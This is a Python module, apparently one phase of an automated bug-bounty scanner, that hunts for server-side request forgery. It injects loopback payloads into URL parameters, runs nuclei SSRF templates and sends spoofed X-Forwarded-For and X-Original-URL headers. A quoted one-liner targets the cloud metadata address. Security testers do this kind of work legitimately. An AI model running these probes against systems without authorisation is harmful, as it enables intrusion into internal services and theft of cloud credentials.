"""
Phase 17: SSRF Detection
Techniques from KingOfBugBountyTips + 0xPugal one-liners.
Pipeline: gf ssrf → qsreplace collaborator → httpx verify + nuclei DAST
"""

import os
import requests as req
from core.runner import run_command, tool_exists
from core.utils import read_lines, write_lines
from config import TOOLS, THREADS


def run_ssrf_qsreplace(input_file: str, output_file: str, logger) -> list[str]:
    """SSRF check via qsreplace with canary URL.
    One-liner: cat urls | grep = | qsreplace "http://169.254.169.254" | httpx -mr "ami-id|instance"
    We use a safe canary instead of actual internal IPs."""
    qsreplace = TOOLS.get("qsreplace", "qsreplace")
    httpx = TOOLS["httpx"]

    if not tool_exists(qsreplace) or not tool_exists(httpx):
        return []

    logger.info("Running SSRF parameter injection check...")
    urls = read_lines(input_file)
    stdin_data = "\n".join(urls)

    # Test with common SSRF payloads
    payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
    ]

    results = []
    for payload in payloads:
        cmd_qs = [qsreplace, payload]
        rc, replaced, _ = run_command(cmd_qs, timeout=30, stdin_data=stdin_data)
        if not replaced:
            continue

        # Check for responses indicating SSRF (connection refused = good sign it tried)
        cmd_httpx = [
            httpx, "-silent", "-nc",
            "-mc", "200,301,302,500",
            "-t", str(min(THREADS, 20)),
        ]
        rc, stdout, _ = run_command(cmd_httpx, timeout=60, stdin_data=replaced)
        if stdout:
            for line in stdout.strip().split("\n"):
                if line.strip():
                    results.append(f"[SSRF-CANDIDATE] {line.strip()} (payload: {payload})")

    unique = sorted(set(results))[:50]
    write_lines(output_file, unique)
    logger.found_count("SSRF candidates (qsreplace)", len(unique))
    return unique


def run_nuclei_ssrf(input_file: str, output_file: str, logger) -> list[str]:
    """Run nuclei with SSRF + DAST templates."""
    tool = TOOLS["nuclei"]
    if not tool_exists(tool):
        return []

    logger.info("Running nuclei SSRF templates...")
    cmd = [
        tool, "-l", input_file,
        "-tags", "ssrf",
        "-o", output_file, "-silent", "-rl", "30",
    ]
    rc, stdout, stderr = run_command(cmd, timeout=600)

    results = read_lines(output_file)
    logger.found_count("SSRF (nuclei)", len(results))
    return results


def check_ssrf_headers(urls_file: str, output_file: str, logger) -> list[str]:
    """Check for SSRF via header injection (X-Forwarded-For, Referer, etc.).
    From twseptian/oneliner-bugbounty header injection technique."""
    logger.info("Checking SSRF via header injection...")
    urls = read_lines(urls_file)[:30]
    findings = []

    ssrf_headers = {
        "X-Forwarded-For": "http://127.0.0.1",
        "X-Forwarded-Host": "127.0.0.1",
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
        "Referer": "http://127.0.0.1",
    }

    for url in urls:
        try:
            resp = req.get(url, headers=ssrf_headers, timeout=5, verify=False, allow_redirects=False)
            if resp.status_code in (200, 301, 302) and any(
                marker in resp.text.lower()
                for marker in ["admin", "dashboard", "internal", "root:"]
            ):
                findings.append(f"[SSRF-HEADER] {url} - status {resp.status_code}")
        except Exception:
            continue

    write_lines(output_file, findings)
    logger.found_count("SSRF via headers", len(findings))
    return findings


def run_phase(domain: str, scan_dir: str, logger) -> str:
    """Run Phase 17: SSRF Detection - multi-technique."""
    logger.phase_start(17, "SSRF Detection", "qsreplace + nuclei + header injection")

    ssrf_file = os.path.join(scan_dir, "urls_ssrf.txt")
    params_file = os.path.join(scan_dir, "parameters.txt")
    live_file = os.path.join(scan_dir, "live_urls.txt")

    if os.path.isfile(ssrf_file) and read_lines(ssrf_file):
        source = ssrf_file
        logger.info(f"Using {len(read_lines(source))} SSRF-categorized URLs")
    elif os.path.isfile(params_file) and read_lines(params_file):
        source = params_file
    else:
        logger.warning("No parameterized URLs - skipping SSRF")
        logger.phase_end(17, "SSRF Detection", 0)
        return ""

    phase_dir = os.path.join(scan_dir, "phase17_ssrf")
    os.makedirs(phase_dir, exist_ok=True)

    all_ssrf = []

    # Technique 1: qsreplace payload injection
    qs_file = os.path.join(phase_dir, "qsreplace_ssrf.txt")
    qs_results = run_ssrf_qsreplace(source, qs_file, logger)
    all_ssrf.extend(qs_results)

    # Technique 2: nuclei SSRF templates
    nuclei_file = os.path.join(phase_dir, "nuclei_ssrf.txt")
    nuclei_results = run_nuclei_ssrf(source, nuclei_file, logger)
    all_ssrf.extend(nuclei_results)

    # Technique 3: Header-based SSRF on live hosts
    if os.path.isfile(live_file):
        header_file = os.path.join(phase_dir, "header_ssrf.txt")
        header_results = check_ssrf_headers(live_file, header_file, logger)
        all_ssrf.extend(header_results)

    ssrf_results = os.path.join(scan_dir, "ssrf_results.txt")
    write_lines(ssrf_results, sorted(set(all_ssrf)))

    logger.phase_end(17, "SSRF Detection", len(set(all_ssrf)))
    return ssrf_results
